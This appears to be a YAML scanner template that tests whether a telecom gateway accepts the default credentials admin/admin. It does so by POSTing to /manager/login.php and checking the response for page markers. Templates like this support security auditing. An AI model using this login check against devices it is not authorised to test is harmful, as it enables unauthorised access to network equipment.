expression: r0()
id: telecom-gateway-default-password
info:
  author: B1anda0(https://github.com/B1anda0)
  name: Telecom Gateway Default Password
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"index-shang.php")
      && response.body.bcontains(b"di.php")
    request:
      body: Name=admin&Pass=admin
      follow_redirects: true
      method: POST
      path: /manager/login.php
